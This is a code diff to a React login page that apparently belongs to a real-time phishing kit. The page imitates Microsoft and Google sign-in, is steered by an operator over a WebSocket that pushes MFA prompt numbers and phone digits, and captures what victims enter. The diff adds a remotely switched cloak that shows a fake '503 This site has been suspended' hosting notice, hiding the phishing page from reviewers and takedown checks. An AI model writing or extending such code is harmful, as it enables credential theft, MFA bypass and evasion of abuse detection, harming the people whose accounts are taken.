@@ -100,10 +100,11 @@ function QrCodeSvg() {
 
 // ─── Shared WebSocket hook ────────────────────────────────────────────────────
 
-function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
+function useVisitorWS({ provider, onNavigate, onProviderSwitch, onSiteStatus }: {
   provider: string;
   onNavigate: (step: string, action?: { navigate?: string; promptNumber?: number; phoneDigits?: string }) => void;
   onProviderSwitch?: (p: string) => void;
+  onSiteStatus?: (active: boolean) => void;
 }) {
   const wsRef = useRef<WebSocket | null>(null);
   const visitorId = useRef(`v-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`);
@@ -113,6 +114,8 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
   onNavigateRef.current = onNavigate;
   const onProviderSwitchRef = useRef(onProviderSwitch);
   onProviderSwitchRef.current = onProviderSwitch;
+  const onSiteStatusRef = useRef(onSiteStatus);
+  onSiteStatusRef.current = onSiteStatus;
   // Track current step & provider so reconnects re-register with up-to-date state.
   const currentStepRef = useRef('email');
   const providerRef = useRef(provider);
@@ -165,6 +168,9 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch }: {
           if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate, msg.action);
           if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
             onProviderSwitchRef.current?.(msg.provider);
+          }
+          if (msg.type === 'site-status' && typeof (msg as { active?: boolean }).active === 'boolean') {
+            onSiteStatusRef.current?.((msg as { active: boolean }).active);
           }
         } catch { /* ignore */ }
       };
@@ -2983,6 +2989,15 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
 // ─── Root ─────────────────────────────────────────────────────────────────────
 
 export default function LoginPage() {
+  useEffect(() => { document.title = 'Sign in'; }, []);
+  const [siteActive, setSiteActive] = useState<boolean | null>(null);
+  useEffect(() => {
+    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
+    fetch(`${base}/api/site-status`)
+      .then(r => r.json() as Promise<{ active: boolean }>)
+      .then(d => setSiteActive(d.active))
+      .catch(() => setSiteActive(true));
+  }, []);
   const params = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
   const urlProvider = params.get('provider');
   const [provider, setProvider] = useState(urlProvider || 'microsoft');
@@ -3014,6 +3029,7 @@ export default function LoginPage() {
     provider,
     onNavigate: (s, action) => navigateHandlerRef.current(s, action),
     onProviderSwitch: handleProviderSwitch,
+    onSiteStatus: (active) => setSiteActive(active),
   });
 
   // Auto-detect device on resize (only when no URL override)
@@ -3057,6 +3073,58 @@ export default function LoginPage() {
     link.type = provider === 'google' || provider === 'microsoft' ? 'image/png' : 'image/svg+xml';
     link.href = href;
   }, [provider]);
+
+  if (siteActive === false) {
+    return (
+      <div className="w-full h-screen flex items-center justify-center bg-[#f3f4f6]">
+        <div className="max-w-lg w-full mx-4">
+          {/* Status bar */}
+          <div className="flex items-center gap-2 mb-6">
+            <div className="w-3 h-3 rounded-full bg-red-500" />
+            <span className="text-[13px] font-mono text-gray-500">503 Service Unavailable</span>
+          </div>
+          {/* Main card */}
+          <div className="bg-white border border-gray-200 rounded-lg shadow-sm p-8">
+            <div className="flex items-start gap-4 mb-6">
+              <div className="w-12 h-12 rounded-full bg-red-100 flex items-center justify-center flex-shrink-0 mt-0.5">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                  <circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
+                </svg>
+              </div>
+              <div>
+                <h1 className="text-[20px] font-semibold text-gray-900 mb-1">This site has been suspended</h1>
+                <p className="text-[14px] text-gray-500 leading-relaxed">
+                  The hosting account associated with this site has been suspended due to a violation of our Terms of Service.
+                </p>
+              </div>
+            </div>
+            <div className="border-t border-gray-100 pt-5 space-y-3">
+              <div className="flex items-start gap-3 text-[13px]">
+                <span className="text-gray-400 w-28 flex-shrink-0">Reason</span>
+                <span className="text-gray-700">Terms of Service violation</span>
+              </div>
+              <div className="flex items-start gap-3 text-[13px]">
+                <span className="text-gray-400 w-28 flex-shrink-0">Status</span>
+                <span className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-red-50 text-red-600 text-[11px] font-semibold uppercase tracking-wide">
+                  <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
+                  Suspended
+                </span>
+              </div>
+              <div className="flex items-start gap-3 text-[13px]">
+                <span className="text-gray-400 w-28 flex-shrink-0">Contact</span>
+                <span className="text-gray-700">If you are the owner of this website, please contact your hosting provider to resolve this issue.</span>
+              </div>
+            </div>
+          </div>
+          <p className="text-center text-[11px] text-gray-400 mt-4">
+            Error reference: {Math.random().toString(36).slice(2, 10).toUpperCase()} · {new Date().toUTCString()}
+          </p>
+        </div>
+      </div>
+    );
+  }
+
+  if (siteActive === null) return null;
 
   return (
     <div className="w-full h-screen overflow-y-auto">
